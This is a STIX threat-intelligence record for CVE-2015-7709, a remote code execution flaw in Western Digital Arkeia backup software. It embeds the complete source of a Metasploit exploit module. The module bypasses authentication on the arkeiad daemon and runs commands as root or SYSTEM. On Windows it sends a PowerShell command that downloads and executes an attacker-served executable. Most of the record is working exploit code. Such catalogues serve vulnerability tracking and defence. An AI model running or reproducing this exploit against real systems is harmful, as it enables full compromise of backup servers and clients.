{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3a0c210f-7c2a-47f1-ae24-873e397322f6",
    "created": "2024-08-14T17:06:39.914821Z",
    "modified": "2024-08-14T17:06:39.914825Z",
    "name": "Western Digital Arkeia Remote Code Execution",
    "description": " This module exploits a code execution flaw in Western Digital Arkeia version 11.0.12 and below. The vulnerability exists in the 'arkeiad' daemon listening on TCP port 617. Because there are insufficient checks on the authentication of all clients, this can be bypassed. Using the ARKFS_EXEC_CMD operation it's possible to execute arbitrary commands with root or SYSTEM privileges. The daemon is installed on both the Arkeia server as well on all the backup clients. The module has been successfully tested on Windows, Linux, OSX, FreeBSD and OpenBSD. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/misc/arkeia_agent_exec.rb",
            "external_id": "arkeia_agent_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-7709"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2015/Jul/54"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'Western Digital Arkeia Remote Code Execution',\n      'Description' => %q{\n        This module exploits a code execution flaw in Western Digital Arkeia version 11.0.12 and below.\n        The vulnerability exists in the 'arkeiad' daemon listening on TCP port 617. Because there are\n        insufficient checks on the authentication of all clients, this can be bypassed.\n        Using the ARKFS_EXEC_CMD operation it's possible to execute arbitrary commands with root or\n        SYSTEM privileges.\n        The daemon is installed on both the Arkeia server as well on all the backup clients. The module\n        has been successfully tested on Windows, Linux, OSX, FreeBSD and OpenBSD.\n      },\n      'Author'       =>\n        [\n          'xistence <xistence[at]0x90.nl>' # Vulnerability discovery and Metasploit module\n        ],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          [ 'CVE', '2015-7709' ],\n          [ 'EDB', '37600' ],\n          [ 'URL', 'https://seclists.org/fulldisclosure/2015/Jul/54' ]\n        ],\n      'Privileged'  => true,\n      'Stance'      => Msf::Exploit::Stance::Aggressive,\n      'Payload'     =>\n        {\n          'DisableNops' => true\n        },\n      'Targets'     =>\n        [\n          [ 'Windows',\n            {\n              'Arch' => ARCH_X86,\n              'Platform' => 'win',\n            }\n          ],\n          [ 'Linux',\n            {\n              'Arch' => ARCH_CMD,\n              'Platform' => 'unix',\n              'Payload' =>\n                {\n                  'DisableNops' => true,\n                  'Space'       => 60000,\n                  'Compat'      => {\n                    'PayloadType' => 'cmd cmd_bash',\n                    'RequiredCmd' => 'perl python bash-tcp gawk openssl'\n                  }\n                }\n            }\n          ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2015-07-10'))\n\n    register_options(\n      [\n        Opt::RPORT(617),\n        OptInt.new('HTTP_DELAY', [true, 'Time that the HTTP Server will wait for the payload request', 15])\n      ])\n  end\n\n  def check\n    connect\n\n    req = \"\\x00\\x41\"\n    req << \"\\x00\" * 5\n    req << \"\\x73\"\n    req << \"\\x00\" * 12\n    req << \"\\xc0\\xa8\\x02\\x74\"\n    req << \"\\x00\" * 56\n    req << \"\\x74\\x02\\xa8\\xc0\"\n    req << 'ARKADMIN'\n    req << \"\\x00\"\n    req << 'root'\n    req << \"\\x00\"\n    req << 'root'\n    req << \"\\x00\" * 3\n    req << '4.3.0-1' # version?\n    req << \"\\x00\" * 11\n\n    sock.put(req)\n\n    header = sock.get_once(6)\n    unless header && header.length == 6 && header[0, 4] == \"\\x00\\x60\\x00\\x04\"\n      disconnect\n      return Exploit::CheckCode::Unknown\n    end\n\n    data_length = sock.get_once(2)\n\n    unless data_length && data_length.length == 2\n      disconnect\n      return Exploit::CheckCode::Unknown\n    end\n\n    data_length = data_length.unpack('n')[0]\n\n    data = sock.get_once(data_length)\n    unless data && data.length == data_length\n      disconnect\n      return Exploit::CheckCode::Unknown\n    end\n\n    req = \"\\x00\\x73\"\n    req << \"\\x00\" * 5\n    req << \"\\x0c\\x32\"\n    req << \"\\x00\" * 11\n\n    sock.put(req)\n    header = sock.get_once(6)\n    unless header && header.length == 6 && header[0, 4] == \"\\x00\\x60\\x00\\x04\"\n      disconnect\n      return Exploit::CheckCode::Unknown\n    end\n\n    data_length = sock.get_once(2)\n\n    unless data_length && data_length.length == 2\n      disconnect\n      return Exploit::CheckCode::Unknown\n    end\n\n    data_length = data_length.unpack('n')[0]\n\n    data = sock.get_once(data_length)\n    unless data && data.length == data_length\n      disconnect\n      return Exploit::CheckCode::Unknown\n    end\n\n    req = \"\\x00\\x61\\x00\\x04\\x00\\x01\\x00\\x11\\x00\\x00\\x31\\x00\"\n    req << 'EN' # Language\n    req << \"\\x00\" * 11\n\n    sock.put(req)\n    header = sock.get_once(6)\n\n    unless header && header.length == 6 && header[0, 4] == \"\\x00\\x43\\x00\\x00\"\n      disconnect\n      return Exploit::CheckCode::Unknown\n    end\n\n    data_length = sock.get_once(2)\n\n    unless data_length && data_length.length == 2\n      disconnect\n      return Exploit::CheckCode::Unknown\n    end\n\n    data_length = data_length.unpack('n')[0]\n\n    unless data_length == 0\n      disconnect\n      return Exploit::CheckCode::Unknown\n    end\n\n    # ARKADMIN_GET_CLIENT_INFO\n    req = \"\\x00\\x62\\x00\\x01\"\n    req << \"\\x00\" * 3\n    req << \"\\x26\"\n    req << 'ARKADMIN_GET_CLIENT_INFO' # Function to request agent information\n    req << \"\\x00\\x32\\x38\"\n    req << \"\\x00\" * 11\n\n    sock.put(req)\n\n    header = sock.get_once(6)\n    unless header && header.length == 6 && header[0, 4] == \"\\x00\\x43\\x00\\x00\"\n      disconnect\n      return Exploit::CheckCode::Unknown\n    end\n\n    data_length = sock.get_once(2)\n\n    unless data_length && data_length.length == 2\n      disconnect\n      return Exploit::CheckCode::Unknown\n    end\n\n    data_length = data_length.unpack('n')[0]\n    unless data_length == 0\n      disconnect\n      return Exploit::CheckCode::Unknown\n    end\n\n    req = \"\\x00\\x63\\x00\\x04\\x00\\x00\\x00\\x12\\x30\\x00\\x31\\x00\\x32\\x38\"\n    req << \"\\x00\" * 12\n\n    sock.put(req)\n\n    # 1st packet\n\n    header = sock.get_once(6)\n    unless header && header.length == 6 && header[0, 4] == \"\\x00\\x63\\x00\\x04\"\n      disconnect\n      return Exploit::CheckCode::Unknown\n    end\n\n    data_length = sock.get_once(2)\n\n    unless data_length && data_length.length == 2\n      disconnect\n      return Exploit::CheckCode::Unknown\n    end\n\n    data_length = data_length.unpack('n')[0]\n\n    data = sock.get_once(data_length)\n    unless data && data.length == data_length\n      disconnect\n      return Exploit::CheckCode::Unknown\n    end\n\n    # 2nd packet\n\n    header = sock.get_once(6)\n    unless header && header.length == 6 && header[0, 4] == \"\\x00\\x68\\x00\\x04\"\n      disconnect\n      return Exploit::CheckCode::Unknown\n    end\n\n    data_length = sock.get_once(2)\n\n    unless data_length && data_length.length == 2\n      disconnect\n      return Exploit::CheckCode::Unknown\n    end\n\n    data_length = data_length.unpack('n')[0]\n\n    data = sock.get_once(data_length)\n    unless data && data.length == data_length\n      disconnect\n      return Exploit::CheckCode::Unknown\n    end\n\n    # 3rd packet\n\n    header = sock.get_once(6)\n    unless header && header.length == 6 && header[0, 4] == \"\\x00\\x65\\x00\\x04\"\n      disconnect\n      return Exploit::CheckCode::Unknown\n    end\n\n    data_length = sock.get_once(2)\n\n    unless data_length && data_length.length == 2\n      disconnect\n      return Exploit::CheckCode::Unknown\n    end\n\n    data_length = data_length.unpack('n')[0]\n\n    data = sock.get_once(data_length)\n    unless data && data.length == data_length && data.include?('You have successfully retrieved client information')\n      disconnect\n      return Exploit::CheckCode::Unknown\n    end\n\n    # 4th packet\n\n    header = sock.get_once(6)\n    unless header && header.length == 6 && header[0, 4] == \"\\x00\\x69\\x00\\x04\"\n      disconnect\n      return Exploit::CheckCode::Unknown\n    end\n\n    data_length = sock.get_once(2)\n\n    unless data_length && data_length.length == 2\n      disconnect\n      return Exploit::CheckCode::Unknown\n    end\n\n    data_length = data_length.unpack('n')[0]\n\n    data = sock.get_once(data_length)\n    unless data && data.length == data_length\n      disconnect\n      return Exploit::CheckCode::Unknown\n    end\n\n    if data =~ /VERSION.*WD Arkeia ([0-9]+\\.[0-9]+\\.[0-9]+)/\n      version = $1\n      vprint_status(\"#{rhost}:#{rport} - Arkeia version detected: #{version}\")\n      if Rex::Version.new(version) <= Rex::Version.new('11.0.12')\n        return Exploit::CheckCode::Appears\n      else\n        return Exploit::CheckCode::Safe\n      end\n    else\n      vprint_status(\"#{rhost}:#{rport} - Arkeia version not detected\")\n      return Exploit::CheckCode::Unknown\n    end\n  end\n\n  def exploit\n    if target.name =~ /Windows/\n\n      @down_file = rand_text_alpha(8+rand(8))\n      @pl = generate_payload_exe\n\n      begin\n        Timeout.timeout(datastore['HTTP_DELAY']) {super}\n      rescue Timeout::Error\n      end\n    elsif target.name =~ /Linux/\n      communicate(payload.encoded)\n      return\n    end\n  end\n\n  def primer\n    @payload_url = get_uri\n\n    # PowerShell web download. The char replacement is needed because using the \"/\" character twice (like http://)\n    # is not possible on Windows agents.\n    command = \"PowerShell -Command \\\"$s=[CHAR][BYTE]47;$b=\\\\\\\"#{@payload_url.gsub(/\\//, '$($s)')}\\\\\\\";\"\n    command << \"(New-Object System.Net.WebClient).DownloadFile($b,'c:/#{@down_file}.exe');\"\n    command << \"(New-Object -com Shell.Application).ShellExecute('c:/#{@down_file}.exe');\\\"\"\n\n    communicate(command)\n  end\n\n  def communicate(command)\n    print_status(\"#{rhost}:#{rport} - Connecting to Arkeia daemon\")\n\n    connect\n\n    print_status(\"#{rhost}:#{rport} - Sending agent communication\")\n\n    req = \"\\x00\\x41\\x00\\x00\\x00\\x00\\x00\\x70\"\n    req << \"\\x00\" * 12\n    req << \"\\xc0\\xa8\\x02\\x8a\"\n    req << \"\\x00\" * 56\n    req << \"\\x8a\\x02\\xa8\\xc0\"\n    req << 'ARKFS'\n    req << \"\\x00\"\n    req << 'root'\n    req << \"\\x00\"\n    req << 'root'\n    req << \"\\x00\" * 3\n    req << '4.3.0-1' # Client version ?\n    req << \"\\x00\" * 11\n\n    sock.put(req)\n\n    header = sock.get_once(6)\n    unless header && header.length == 6 && header[0, 4] == \"\\x00\\x60\\x00\\x04\"\n      disconnect\n      fail_with(Failure::Unknown, \"#{rhost}:#{rport} - Failure reading packet identifier\")\n    end\n\n    data_length = sock.get_once(2)\n\n    unless data_length && data_length.length == 2\n      disconnect\n      fail_with(Failure::Unknown, \"#{rhost}:#{rport} - Failure reading packet length\")\n    end\n\n    data_length = data_length.unpack('n')[0]\n\n    data = sock.get_once(data_length)\n    unless data && data.length == data_length\n      disconnect\n      fail_with(Failure::Unknown, \"#{rhost}:#{rport} - Failure reading packet data\")\n    end\n\n    req = \"\\x00\\x73\\x00\\x00\\x00\\x00\\x00\\x0c\\x32\"\n    req << \"\\x00\" * 11\n\n    sock.put(req)\n    header = sock.get_once(6)\n    unless header && header.length == 6 && header[0, 4] == \"\\x00\\x60\\x00\\x04\"\n      disconnect\n      fail_with(Failure::Unknown, \"#{rhost}:#{rport} - Failure reading packet identifier\")\n    end\n\n    data_length = sock.get_once(2)\n\n    unless data_length && data_length.length == 2\n      disconnect\n      fail_with(Failure::Unknown, \"#{rhost}:#{rport} - Failure reading packet length\")\n    end\n\n    data_length = data_length.unpack('n')[0]\n\n    data = sock.get_once(data_length)\n    unless data && data.length == data_length\n      disconnect\n      fail_with(Failure::Unknown, \"#{rhost}:#{rport} - Failure reading packet data\")\n    end\n\n    req = \"\\x00\\x61\\x00\\x04\\x00\\x01\\x00\\x1a\\x00\\x00\"\n    req << rand_text_numeric(10) # \"1234567890\" - 10 byte numerical value, like a session ID?\n    req << \"\\x00\"\n    req << 'EN' # English language?\n    req << \"\\x00\" * 11\n\n    sock.put(req)\n    header = sock.get_once(6)\n    unless header && header.length == 6 && header[0, 4] == \"\\x00\\x43\\x00\\x00\"\n      disconnect\n      fail_with(Failure::Unknown, \"#{rhost}:#{rport} - Failure reading packet identifier\")\n    end\n\n    data_length = sock.get_once(2)\n\n    unless data_length && data_length.length == 2\n      disconnect\n      fail_with(Failure::Unknown, \"#{rhost}:#{rport} - Failure reading packet length\")\n    end\n\n    data_length = data_length.unpack('n')[0]\n\n    unless data_length == 0\n      disconnect\n      fail_with(Failure::Unknown, \"#{rhost}:#{rport} - Unexpected length read\")\n    end\n\n    req = \"\\x00\\x62\\x00\\x01\\x00\\x02\\x00\\x1b\"\n    req << 'ARKFS_EXEC_CMD' # With this function we can execute system commands with root/SYSTEM privileges\n    req << \"\\x00\\x31\"\n    req << \"\\x00\" * 11\n\n    sock.put(req)\n\n    header = sock.get_once(6)\n    unless header && header.length == 6 && header[0, 4] == \"\\x00\\x43\\x00\\x00\"\n      disconnect\n      fail_with(Failure::Unknown, \"#{rhost}:#{rport} - Failure reading packet identifier\")\n    end\n\n    data_length = sock.get_once(2)\n\n    unless data_length && data_length.length == 2\n      disconnect\n      fail_with(Failure::Unknown, \"#{rhost}:#{rport} - Failure reading packet length\")\n    end\n\n    data_length = data_length.unpack('n')[0]\n\n    unless data_length == 0\n      disconnect\n      fail_with(Failure::Unknown, \"#{rhost}:#{rport} - Unexpected length read\")\n    end\n\n    req = \"\\x00\\x63\\x00\\x04\\x00\\x03\\x00\\x15\\x31\\x00\\x31\\x00\\x31\\x00\\x30\\x3a\\x31\\x2c\"\n    req << \"\\x00\" * 11\n\n    sock.put(req)\n\n    command_length = '%02x' % command.length\n    command_length = command_length.scan(/../).map { |x| x.hex.chr }.join\n\n    req = \"\\x00\\x64\\x00\\x04\\x00\\x04\"\n    req << [command.length].pack('n')\n    req << command # Our command to be executed\n    req << \"\\x00\"\n\n    print_status(\"#{rhost}:#{rport} - Executing payload through ARKFS_EXEC_CMD\")\n\n    sock.put(req)\n\n    header = sock.get_once(6)\n    unless header && header.length == 6 && header[0, 4] == \"\\x00\\x63\\x00\\x04\"\n      disconnect\n      fail_with(Failure::Unknown, \"#{rhost}:#{rport} - Failure reading packet identifier\")\n    end\n\n    data_length = sock.get_once(2)\n\n    unless data_length && data_length.length == 2\n      disconnect\n      fail_with(Failure::Unknown, \"#{rhost}:#{rport} - Failure reading packet length\")\n    end\n\n    data_length = data_length.unpack('n')[0]\n\n    data = sock.get_once(data_length)\n    unless data && data.length == data_length\n      disconnect\n      fail_with(Failure::Unknown, \"#{rhost}:#{rport} - Failure reading packet data\")\n    end\n\n    # 1st Packet\n\n    header = sock.get_once(6)\n    unless header && header.length == 6 && header[0, 4] == \"\\x00\\x68\\x00\\x04\"\n      disconnect\n      fail_with(Failure::Unknown, \"#{rhost}:#{rport} - Failure reading packet identifier\")\n    end\n\n    data_length = sock.get_once(2)\n\n    unless data_length && data_length.length == 2\n      disconnect\n      fail_with(Failure::Unknown, \"#{rhost}:#{rport} - Failure reading packet length\")\n    end\n\n    data_length = data_length.unpack('n')[0]\n\n    data = sock.get_once(data_length)\n    unless data && data.length == data_length\n      disconnect\n      fail_with(Failure::Unknown, \"#{rhost}:#{rport} - Failure reading packet data\")\n    end\n\n    # 2st Packet\n\n    header = sock.get_once(6)\n    unless header && header.length == 6 && header[0, 4] == \"\\x00\\x68\\x00\\x04\"\n      disconnect\n      fail_with(Failure::Unknown, \"#{rhost}:#{rport} - Failure reading packet identifier\")\n    end\n\n    data_length = sock.get_once(2)\n\n    unless data_length && data_length.length == 2\n      disconnect\n      fail_with(Failure::Unknown, \"#{rhost}:#{rport} - Failure reading packet length\")\n    end\n\n    data_length = data_length.unpack('n')[0]\n\n    data = sock.get_once(data_length)\n    unless data && data.length == data_length\n      disconnect\n      fail_with(Failure::Unknown, \"#{rhost}:#{rport} - Failure reading packet data\")\n    end\n  end\n\n  def on_request_uri(cli, request)\n    print_status(\"Request: #{request.uri}\")\n    if request.uri == get_resource\n      print_status('Sending payload...')\n      send_response(cli, @pl)\n      register_files_for_cleanup(\"c:\\\\#{@down_file}.exe\")\n    end\n  end\n\n  def autofilter\n    true\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-07-10",
    "x_mitre_platforms": [
        "unix'"
    ]
}